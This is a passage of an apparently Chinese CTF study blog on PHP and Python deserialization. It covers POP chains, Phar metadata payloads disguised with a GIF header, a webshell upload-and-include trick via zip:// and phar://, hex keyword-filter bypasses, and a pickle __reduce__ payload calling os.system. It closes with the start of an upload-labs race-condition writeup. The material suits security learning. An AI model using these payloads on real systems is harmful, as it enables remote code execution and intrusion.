+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="comment">//赋值</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public function safe()&#123;</span></span><br><span class="line"><span class="comment">// echo $this-&gt;arg;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function evil() &#123;</span></span><br><span class="line"><span class="comment">// eval($this-&gt;arg);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function run()&#123;</span></span><br><span class="line"><span class="comment">// $this-&gt;&#123;$this-&gt;func&#125;();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $obj = unserialize($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">// $obj-&gt;run();</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再在最后输出结果</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));    <span class="comment">//单纯序列化</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>())));    <span class="comment">//进行url编码</span></span><br></pre></td></tr></table></figure></blockquote>
+<p>‍</p>
+<h3 id="三种赋值"><a href="#三种赋值" class="headerlink" title="三种赋值"></a>三种赋值</h3><p>内部直接赋值 只能赋值字符串</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure></blockquote>
+<p>外部赋值 只能访问public属性的变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建一个然后直接输出这个$o</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">DEMO1</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; arg = <span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>)); </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>小技巧：</strong>  对于php7.1+版本，对属性容错机制较高，就算不是public也可以在本地修改成public</p>
+</blockquote>
+<h6 id="构造方法赋值-万能方法-解决上述所有麻烦"><a href="#构造方法赋值-万能方法-解决上述所有麻烦" class="headerlink" title="构造方法赋值 (万能方法)解决上述所有麻烦"></a>构造方法赋值 (万能方法)解决上述所有麻烦</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; arg = <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="POP-chain"><a href="#POP-chain" class="headerlink" title="POP chain"></a>POP chain</h3><h4 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()		   <span class="comment">//对象创建(new)时会自动调用。</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 		       <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 		       <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 	       <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() 		       <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 	       <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() 		       <span class="comment">//用于从不可访问的属性读取数据 包括private或者是不存在的</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() 		       <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 		       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()  		       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 		   <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()             <span class="comment">//当脚本尝试将对象调用为函数时触发  就是加了括号</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()           <span class="comment">//在代码中当调用不存在的类时会</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id><a href="#" class="headerlink" title></a></h4><h2 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h2><h4 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h4><ol>
+<li>写出基本序列化</li>
+<li>写出注入的对象</li>
+<li>写出注入的对象 分析是长到短还是短到长的替换，决定要把对象注入到什么地方</li>
+<li>算清楚替换的差值，计算需要吃掉或挤出（逃逸）的字符串长度，保证这个长度是替换的差值的整数倍，如果不是 则加字符串</li>
+<li>构造替换，对象注入</li>
+</ol>
+<h4 id="长到短的替换"><a href="#长到短的替换" class="headerlink" title="长到短的替换"></a>长到短的替换</h4><p>在第一个元素进行替换，进而吃掉第二个元素的约束，第二个元素就逃逸出来了</p>
+<h4 id="短到长的替换"><a href="#短到长的替换" class="headerlink" title="短到长的替换"></a>短到长的替换</h4><p>暂缺</p>
+<p>‍</p>
+<h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h3 id="Phar是什么？"><a href="#Phar是什么？" class="headerlink" title="Phar是什么？"></a>Phar是什么？</h3><p>可以将多个文件组合成一个文件，</p>
+<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>phar:&#x2F;&#x2F;xxx.phar&#x2F;1.png</p>
+<p>zip:&#x2F;&#x2F;xxx.zip#1.png</p>
+<h3 id="攻击思路-在上传包含中的利用"><a href="#攻击思路-在上传包含中的利用" class="headerlink" title="攻击思路 在上传包含中的利用"></a>攻击思路 在上传包含中的利用</h3><p>可以上传图片，不能上传php</p>
+<p>可以包含 但是只能<code>include(&#39;$userinput.php&#39;);</code>​</p>
+<p>压缩一个shell.php到1.zip,重命名为1.png，上传</p>
+<p>包含：zip:&#x2F;&#x2F;upload.png#shell或phar:&#x2F;&#x2F;upload.png&#x2F;shell 因为在包含的时候在尾部上面的include会拼接上一个php</p>
+<h3 id="如何反序列化"><a href="#如何反序列化" class="headerlink" title="如何反序列化"></a>如何反序列化</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ol>
+<li>需要有可用的类，类下有魔术方法，最后POP chain调用到危险方法</li>
+<li>需要文件操作函数去触发 <code>phar://</code>​ stream</li>
+<li>有上传或者写文件的操作，可以把无损phar文件写入web服务器，后缀名任意</li>
+</ol>
+<h4 id="本地phar的条件"><a href="#本地phar的条件" class="headerlink" title="本地phar的条件"></a>本地phar的条件</h4><p>在php.ini中 <strong>phar.readonly</strong>  <strong>&#x3D;</strong>  <strong>Off</strong></p>
+<h4 id="构造phar反序列化"><a href="#构造phar反序列化" class="headerlink" title="构造phar反序列化"></a>构造phar反序列化</h4><ol>
+<li>把class定义的代码抄下来，把方法注释了</li>
+<li>构造pop链</li>
+<li><del>echo serialize($o)</del></li>
+<li>贴phar八股文</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>还是正常做反序列化的流程，找pop chain，然后本地构造好序列化</p>
+<p>之前:echo serialize($o);</p>
+<p>现在:生成phar文件把$o加载进去 就是在setMetadata中</p>
+<h4 id="可以利用的函数"><a href="#可以利用的函数" class="headerlink" title="可以利用的函数"></a>可以利用的函数</h4><p><img src="/.com//17476573059446373117876879156311-20250519202147-4srw68y.png" alt="17476573059446373117876879156311"></p>
+<h4 id="绕过反序列化中的关键字"><a href="#绕过反序列化中的关键字" class="headerlink" title="绕过反序列化中的关键字"></a>绕过反序列化中的关键字</h4><h5 id="hex-通用"><a href="#hex-通用" class="headerlink" title="hex 通用"></a>hex 通用</h5><p>&#x3D;&#x3D;s:1:“A” 和 S:1:”\61”是一样的意思&#x3D;&#x3D;</p>
+<p>当标识字符串的s为大写的时候，\hex标识对应字符</p>
+<p>所以绕过flag的过滤：S:4:“\66\6c\61\67”</p>
+<h5 id="绕过-0字符-php7-1"><a href="#绕过-0字符-php7-1" class="headerlink" title="绕过\0字符 php7.1+"></a>绕过\0字符 php7.1+</h5><p>虽然类中定义的属性可能不是public 但是我们可以假装是public，然后生成public类型的反序列化字符串。由于PHP7.1+的容错机制可以反序列化成功</p>
+<p>private-&gt;public</p>
+<p>‍</p>
+<h1 id="0720-Pickle反序列化"><a href="#0720-Pickle反序列化" class="headerlink" title="0720 Pickle反序列化"></a>0720 Pickle反序列化</h1><h3 id="what-is-Pickle？"><a href="#what-is-Pickle？" class="headerlink" title="what is Pickle？"></a>what is Pickle？</h3><ul>
+<li>是<strong>python</strong>的一个模块，内存中的东西因为断电等原因容易丢失，可以将对象以文件的形式存放在磁盘上 实现持久化存储</li>
+<li>只能在python中使用 import pickle</li>
+<li>序列化后的数据可读性非常差 人一般无法识别</li>
+<li>cPickle模块是C语言实现的</li>
+</ul>
+<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>​<code>pickle.dump(obj, file[,protocol])</code>​</p>
+<p>如果加s dumps 返回字符串 否则是到文件中</p>
+<p>序列化对象，将结果数据流写入到文件对象中</p>
+<p>参数protocol是序列化模式，默认为0，表示以文本的形式序列化，还可以是1或2，表示以二进制的形式序列化</p>
+<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">name</span>=&quot;<span class="title">test</span>&quot;):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">name</span> = <span class="title">name</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">say</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">print</span>(&quot;<span class="title">Hello</span> ! <span class="title">My</span> <span class="title">friends</span>&quot;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">a</span> = <span class="title">People</span>()</span></span><br><span class="line"><span class="class"><span class="title">c</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">a</span>)</span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="title">c</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>out: 很多不可见字符</p>
+<p>​<code>b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x04test\x94sb.&#39;</code>​</p>
+<p>生成的规则涉及到PVM：用来解释字节码的解释引擎</p>
+<p>‍</p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>​<code>pickle.load(file)</code>​</p>
+<p>如果加s dumps 返回字符串 否则是到文件中</p>
+<p>反序列化对象。将文件中的数据解析为一个python对象；</p>
+<p>需要注意：使用时需要让python能够找到类的定义 否则会报错</p>
+<p>‍</p>
+<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>Pickle是一门基于栈的编程语言，有不同的编写方式，本质是一个轻量级的PVM（在Java中等同于JVM，用于解释字节码的解释引擎）</p>
+<p>有三个部分组成：</p>
+<ol>
+<li><strong>指令处理器（Instruction processor）</strong></li>
+</ol>
+<p>从数据流读取操作码和参数，对其进行解释处理 指令处理器会循环执行整个过程，不断改变stack(堆栈)和memo(备忘录)区域的值 直到遇到‘ <strong>.</strong> ‘这个结束符号。这时，最终停留在栈顶的值将会被作为反序列化对象返回。</p>
+<ol start="2">
+<li><strong>栈区（stack）</strong></li>
+</ol>
+<p>由python的列表list实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果。</p>
+<ol start="3">
+<li><strong>内存区（memo）</strong></li>
+</ol>
+<p>由python的字典dict实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供存储功能，即将反序列化完成的数据以key-value的形式储存在memo中以便使用。</p>
+<p>在第一部分中的IP常用操作码：</p>
+<ul>
+<li><p><strong>c</strong>：读取本行的内容作为模块名module，读取下一行内容作为对象名object，然后将module.object作为可调用对象压入栈中</p>
+</li>
+<li><p><strong>(</strong> ：将标记对象（mark）压入栈中，用于确定命令执行的位置，搭配t指令一起使用以便产生一个元组</p>
+</li>
+<li><p><strong>S</strong>: 后跟字符串在引号内 直到出现换行符 PVM将读取的内容压入栈中</p>
+</li>
+<li><p><strong>t</strong> : 从栈中向外弹出数据，弹射顺序从栈顶一点点出到元组依次后排 直到弹出左括号 此时弹出内容形成一个元组 然后再压入栈中</p>
+</li>
+<li><p><strong>R</strong> : 将之前压入栈中的元组（t）和可调用对象（c）全部弹出，然后将该元组作为可调用参数的对象并执行该对象。最终将结果压入到栈中。</p>
+</li>
+<li><p><strong>.</strong>  : 结束整个Pickle反序列化过程</p>
+</li>
+</ul>
+<p><img src="/.com//1747658503023977923255372684818-20250519204144-7ybitsg.png" alt="1747658503023977923255372684818"></p>
+<p><img src="/.com//17476585059844407908704057067474-20250519204146-hby8s9y.png" alt="17476585059844407908704057067474"></p>
+<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
+<p><strong>漏洞利用</strong>：利用<code>__reduce__()</code>​</p>
+<p><img src="/.com//17476585130011225927306100130946-20250519204153-53pqeav.png" alt="17476585130011225927306100130946"></p>
+<p><img src="/.com//17476585152762147770201117664215-20250519204156-hmuqk2h.png" alt="17476585152762147770201117664215"></p>
+<p>实际代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__reduce__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">a</span> = &#x27;<span class="title">whoami</span>&#x27;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> (<span class="title">os</span>.<span class="title">system</span>, (<span class="title">a</span>,))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">o</span> = <span class="title">A</span>()</span></span><br><span class="line"><span class="class">#序列化</span></span><br><span class="line"><span class="class"><span class="title">test</span> = <span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">o</span>)</span></span><br><span class="line"><span class="class">#反序列化</span></span><br><span class="line"><span class="class"><span class="title">pickle</span>.<span class="title">loads</span>(<span class="title">test</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#本地运行结果即为电脑名称</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>做题步骤</strong></p>
+<ol>
+<li>找 pickle反序列化位点</li>
+<li>本地重写reduce方法，生成反序列化字符串</li>
+<li>触发反序列化</li>
+</ol>
+<p><strong>与php反序列化的区别</strong></p>
+<p>php中能做什么由网站里面的class类写得方法决定</p>
+<p>但是pickle只要存在反序列化的位点就可以任意执行，因为本地可以重写reduce方法</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" data-id="cmaxy8gc7002ykg7k7phl2mtp" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/Apache解析漏洞+条件竞争" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache解析漏洞-条件竞争"><a href="#Apache解析漏洞-条件竞争" class="headerlink" title="Apache解析漏洞+条件竞争"></a>Apache解析漏洞+条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span 